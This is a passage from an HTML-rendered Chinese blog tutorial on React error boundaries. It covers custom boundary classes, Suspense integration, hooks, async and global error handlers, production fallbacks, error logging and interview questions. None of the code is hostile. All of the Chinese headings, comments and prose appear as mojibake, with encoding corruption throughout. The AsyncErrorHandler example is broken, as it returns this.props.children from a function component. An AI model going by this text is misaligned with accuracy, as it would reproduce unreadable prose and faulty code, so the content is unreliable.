class="hljs-property">props</span>.<span class="hljs-property">onError</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-title function_">onError</span>(error, errorInfo);<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span> <br>      ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">fallback</span> <br>      : <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br>&lt;<span class="hljs-title class_">MonitoringErrorBoundary</span><br>  fallback=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorScreen</span> /&gt;</span></span>&#125;<br>  onError=&#123;<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// ç‰¹æ®Šé”™è¯¯ç±»å‹å¤„ç†</span><br>    <span class="hljs-keyword">if</span> (error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">PaymentError</span>) &#123;<br>      router.<span class="hljs-title function_">navigate</span>(<span class="hljs-string">&#x27;/payment-failed&#x27;</span>);<br>    &#125;<br>  &#125;&#125;<br>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">CheckoutProcess</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">MonitoringErrorBoundary</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>é”™è¯¯è¾¹ç•Œä¸Suspenseé›†æˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AsyncBoundary</span>(<span class="hljs-params">&#123; children, fallback, errorFallback &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;errorFallback&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">React.Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;fallback&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;children&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">React.Suspense</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br>&lt;<span class="hljs-title class_">AsyncBoundary</span> <br>  fallback=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Spinner</span> /&gt;</span></span>&#125;<br>  errorFallback=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AsyncError</span> /&gt;</span></span>&#125;<br>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LazyComponent</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">AsyncBoundary</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="å‡½æ•°ç»„ä»¶é”™è¯¯å¤„ç†æ–¹æ¡ˆ"><a href="#å‡½æ•°ç»„ä»¶é”™è¯¯å¤„ç†æ–¹æ¡ˆ" class="headerlink" title="å‡½æ•°ç»„ä»¶é”™è¯¯å¤„ç†æ–¹æ¡ˆ"></a>å‡½æ•°ç»„ä»¶é”™è¯¯å¤„ç†æ–¹æ¡ˆ</h3><p><strong>è‡ªå®šä¹‰Hookå®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useErrorBoundary</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-keyword">const</span> handleError = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">setError</span>(err);<br>    <span class="hljs-keyword">return</span> err;<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">const</span> resetError = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">setError</span>(<span class="hljs-literal">null</span>);<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">return</span> [error, handleError, resetError];<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentWithError</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [error, handleError, resetError] = <span class="hljs-title function_">useErrorBoundary</span>();<br>  <br>  <span class="hljs-keyword">if</span> (error) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ç»„ä»¶å‡ºé”™: &#123;error.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;resetError&#125;</span>&gt;</span>é‡è¯•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UnstableComponent</span> <span class="hljs-attr">onError</span>=<span class="hljs-string">&#123;handleError&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UnstableComponent</span>(<span class="hljs-params">&#123; onError &#125;</span>) &#123;<br>  <span class="hljs-comment">// æ¨¡æ‹Ÿé”™è¯¯</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">throwError</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// å¯èƒ½å‡ºé”™çš„æ“ä½œ</span><br>      <span class="hljs-title function_">riskyOperation</span>();<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>      <span class="hljs-title function_">onError</span>(err); <span class="hljs-comment">// æ‰‹åŠ¨è§¦å‘é”™è¯¯è¾¹ç•Œ</span><br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;throwError&#125;</span>&gt;</span>æ‰§è¡Œå±é™©æ“ä½œ<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰æ–¹Hookåº“</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ react-error-boundary åº“</span><br><span class="hljs-keyword">import</span> &#123; useErrorBoundary &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-error-boundary&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; showBoundary &#125; = <span class="hljs-title function_">useErrorBoundary</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUserData</span>();<br>      <span class="hljs-comment">// å¤„ç†æ•°æ®...</span><br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      <span class="hljs-title function_">showBoundary</span>(error);<br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;loadData&#125;</span>&gt;</span>åŠ è½½æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¸¸è§é”™è¯¯åœºæ™¯ä¸è§£å†³æ–¹æ¡ˆ"><a href="#å¸¸è§é”™è¯¯åœºæ™¯ä¸è§£å†³æ–¹æ¡ˆ" class="headerlink" title="å¸¸è§é”™è¯¯åœºæ™¯ä¸è§£å†³æ–¹æ¡ˆ"></a>å¸¸è§é”™è¯¯åœºæ™¯ä¸è§£å†³æ–¹æ¡ˆ</h3><p><strong>å¼‚æ­¥é”™è¯¯æ•è·</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”™è¯¯è¾¹ç•Œæ— æ³•æ•è·çš„å¼‚æ­¥é”™è¯¯è§£å†³æ–¹æ¡ˆ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AsyncErrorHandler</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// å…¨å±€æœªæ•è·é”™è¯¯å¤„ç†</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUnhandledRejection</span> = (<span class="hljs-params">event</span>) =&gt; &#123;<br>      <span class="hljs-title function_">setError</span>(event.<span class="hljs-property">reason</span>);<br>    &#125;;<br>    <br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUncaughtError</span> = (<span class="hljs-params">event</span>) =&gt; &#123;<br>      <span class="hljs-title function_">setError</span>(event.<span class="hljs-property">error</span>);<br>    &#125;;<br>    <br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;unhandledrejection&#x27;</span>, handleUnhandledRejection);<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;error&#x27;</span>, handleUncaughtError);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;unhandledrejection&#x27;</span>, handleUnhandledRejection);<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;error&#x27;</span>, handleUncaughtError);<br>    &#125;;<br>  &#125;, []);<br>  <br>  <span class="hljs-keyword">if</span> (error) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">GlobalErrorScreen</span> <span class="hljs-attr">error</span>=<span class="hljs-string">&#123;error&#125;</span> /&gt;</span></span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>&#125;<br><br><span class="hljs-comment">// åœ¨åº”ç”¨é¡¶å±‚ä½¿ç”¨</span><br>&lt;<span class="hljs-title class_">AsyncErrorHandler</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">AsyncErrorHandler</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>é”™è¯¯è¾¹ç•ŒåµŒå¥—å†²çª</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è‡ªå®šä¹‰é”™è¯¯ä¼ æ’­æœºåˆ¶</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PropagatingErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">onError</span>) &#123;<br>      <span class="hljs-comment">// å°†é”™è¯¯ä¼ é€’ç»™çˆ¶çº§è¾¹ç•Œ</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-title function_">onError</span>(error, errorInfo);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span>) &#123;<br>      <span class="hljs-comment">// æ²¡æœ‰çˆ¶çº§å¤„ç†å™¨æ—¶å¤„ç†é”™è¯¯</span><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Unhandled error:&#x27;</span>, error, errorInfo);<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span> <br>      ? <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">fallback</span> <br>      : <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br>&lt;<span class="hljs-title class_">PropagatingErrorBoundary</span> <br>  onError=&#123;<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123; <span class="hljs-comment">/* ä¼ é€’ç»™ä¸Šå±‚ */</span> &#125;&#125;<br>  fallback=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LocalFallback</span> /&gt;</span></span>&#125;<br>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> /&gt;</span></span><br>&lt;/<span class="hljs-title class_">PropagatingErrorBoundary</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>ç”Ÿäº§ç¯å¢ƒé”™è¯¯å¤„ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒä¸“ç”¨é”™è¯¯è¾¹ç•Œ</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductionErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> &#125;);<br>    <br>    <span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒç‰¹æ®Šå¤„ç†</span><br>    <span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>      <span class="hljs-title function_">sendProductionErrorReport</span>(error, &#123;<br>        <span class="hljs-attr">componentStack</span>: errorInfo.<span class="hljs-property">componentStack</span>,<br>        <span class="hljs-attr">userAgent</span>: navigator.<span class="hljs-property">userAgent</span><br>      &#125;);<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">productionFallback</span> || (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;production-error&quot;</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>æŠ±æ­‰ï¼Œå‡ºç°äº†ä¸€äº›é—®é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æˆ‘ä»¬çš„å›¢é˜Ÿå·²æ”¶åˆ°é€šçŸ¥ï¼Œæ­£åœ¨ä¿®å¤<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> window.location.reload()&#125;&gt;</span><br><span class="language-xml">            åˆ·æ–°é¡µé¢</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>      );<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é”™è¯¯è¾¹ç•Œæœ€ä½³å®è·µ"><a href="#é”™è¯¯è¾¹ç•Œæœ€ä½³å®è·µ" class="headerlink" title="é”™è¯¯è¾¹ç•Œæœ€ä½³å®è·µ"></a>é”™è¯¯è¾¹ç•Œæœ€ä½³å®è·µ</h3><p><strong>åˆ†å±‚é”™è¯¯å¤„ç†ç­–ç•¥</strong></p><pre class="mermaid">graph LR    A[é¡¶å±‚è¾¹ç•Œ] -->|æ•è·å…¨å±€é”™è¯¯| B[åº”ç”¨å´©æºƒé¡µé¢]    C[æ¨¡å—è¾¹ç•Œ] -->|æ•è·æ¨¡å—é”™è¯¯| D[æ¨¡å—é™çº§UI]    E[ç»„ä»¶è¾¹ç•Œ] -->|æ•è·ç»„ä»¶é”™è¯¯| F[ç»„ä»¶å ä½ç¬¦]    G[APIè¾¹ç•Œ] -->|æ•è·æ•°æ®é”™è¯¯| H[ç©ºçŠ¶æ€æç¤º]</pre><p><strong>é”™è¯¯æ¢å¤ç­–ç•¥æ¯”è¾ƒ</strong></p><table><thead><tr><th align="left">ç­–ç•¥</th><th align="left">å®ç°æ–¹å¼</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">é¡µé¢åˆ·æ–°</td><td align="left">window.location.reload()</td><td align="left">å…¨å±€çŠ¶æ€ä¸å¯æ¢å¤</td></tr><tr><td align="left">ç»„ä»¶é‡ç½®</td><td align="left">key å±æ€§å˜åŒ–</td><td align="left">ç‹¬ç«‹ç»„ä»¶å¤±è´¥</td></tr><tr><td align="left">çŠ¶æ€å›æ»š</td><td align="left">æ¢å¤ä¹‹å‰çš„çŠ¶æ€å¿«ç…§</td><td align="left">è¡¨å•æ“ä½œå¤±è´¥</td></tr><tr><td align="left">å¤‡ç”¨æ•°æ®</td><td align="left">æ˜¾ç¤ºç¼“å­˜æ•°æ®</td><td align="left">æ•°æ®è·å–å¤±è´¥</td></tr></tbody></table><p><strong>é”™è¯¯æ—¥å¿—è§„èŒƒ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">logErrorBoundary</span>(<span class="hljs-params">error, info</span>) &#123;<br>  <span class="hljs-keyword">const</span> logEntry = &#123;<br>    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>(),<br>    <span class="hljs-attr">message</span>: error.<span class="hljs-property">message</span>,<br>    <span class="hljs-attr">stack</span>: error.<span class="hljs-property">stack</span>,<br>    <span class="hljs-attr">componentStack</span>: info.<span class="hljs-property">componentStack</span>,<br>    <span class="hljs-attr">location</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,<br>    <span class="hljs-attr">user</span>: currentUser ? currentUser.<span class="hljs-property">id</span> : <span class="hljs-string">&#x27;anonymous&#x27;</span>,<br>    <span class="hljs-attr">platform</span>: navigator.<span class="hljs-property">platform</span>,<br>    <span class="hljs-attr">environment</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span>,<br>    <span class="hljs-attr">version</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">REACT_APP_VERSION</span><br>  &#125;;<br>  <br>  <span class="hljs-comment">// å‘é€åˆ°æ—¥å¿—æœåŠ¡</span><br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/logs/errors&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span> &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(logEntry)<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é¢è¯•é«˜é¢‘é—®é¢˜è§£æ"><a href="#é¢è¯•é«˜é¢‘é—®é¢˜è§£æ" class="headerlink" title="é¢è¯•é«˜é¢‘é—®é¢˜è§£æ"></a>é¢è¯•é«˜é¢‘é—®é¢˜è§£æ</h3><p><strong>Qï¼šé”™è¯¯è¾¹ç•Œå¯ä»¥æ•è·å“ªäº›ç±»å‹çš„é”™è¯¯ï¼Ÿ</strong></p><ul><li>å­ç»„ä»¶æ¸²æŸ“æœŸé—´çš„é”™è¯¯</li><li>ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¸­çš„é”™è¯¯ï¼ˆåŒ…æ‹¬æ¸²æŸ“é˜¶æ®µï¼‰</li><li>æ„é€ å‡½æ•°ä¸­çš„é”™è¯¯</li><li>æ•´ä¸ªç»„ä»¶æ ‘çš„é”™è¯¯ï¼ˆåŒ…æ‹¬å¼‚æ­¥ä»£ç ä¸­çš„é”™è¯¯ï¼Ÿä¸è¡Œï¼ï¼‰</li></ul><p>ç‰¹åˆ«æ³¨æ„ï¼š</p><ul><li>äº‹ä»¶å¤„ç†ç¨‹åºä¸­çš„é”™è¯¯ä¸ä¼šè¢«æ•è·</li><li>å¼‚æ­¥ä»£ç ï¼ˆsetTimeout, Promiseï¼‰é”™è¯¯ä¸ä¼šè¢«æ•è·</li><li>æœåŠ¡ç«¯æ¸²æŸ“é”™è¯¯ä¸ä¼šè¢«æ•è·</li><li>é”™è¯¯è¾¹ç•Œè‡ªèº«æŠ›å‡ºçš„é”™è¯¯ä¸ä¼šè¢«æ•è·</li></ul><p><strong>Qï¼šä¸ºä»€ä¹ˆé”™è¯¯è¾¹ç•Œå¿…é¡»ç”¨ç±»ç»„ä»¶å®ç°ï¼Ÿ</strong></p><ul><li>å› ä¸ºé”™è¯¯è¾¹ç•Œä¾èµ– getDerivedStateFromError å’Œ componentDidCatch ç”Ÿå‘½å‘¨æœŸæ–¹æ³•</li><li>è¿™ä¸¤ä¸ªæ–¹æ³•ç›®å‰åªåœ¨ç±»ç»„ä»¶ä¸­å¯ç”¨</li><li>React å›¢é˜Ÿè¡¨ç¤ºæš‚æ—¶æ²¡æœ‰è®¡åˆ’åœ¨å‡½æ•°ç»„ä»¶ä¸­æ·»åŠ 